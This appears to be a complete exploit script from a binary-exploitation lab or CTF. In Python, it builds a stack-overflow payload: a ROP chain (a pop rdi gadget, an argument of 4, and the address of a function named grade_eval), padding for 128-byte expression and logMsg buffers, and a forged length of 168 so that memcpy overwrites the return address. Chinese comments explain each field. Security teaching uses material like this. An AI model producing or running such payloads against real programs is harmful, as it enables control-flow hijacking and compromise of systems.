import sys, struct

content  = struct.pack("<Q", 0x4018a3)   # pop rdi; ret
content += struct.pack("<Q", 4)          # rdi = 4
content += struct.pack("<Q", 0x401677)   # grade_eval
content += b"B" * (128 - len(content))

payload  = content                       # expression[128]，会被 memcpy 拷到别处
payload += b"C" * 128                    # logMsg[128]
payload += struct.pack("<i", 168)        # len：把目的地推到返回地址
payload += b"D" * 8                      # pad[8]

sys.stdout.buffer.write(payload)
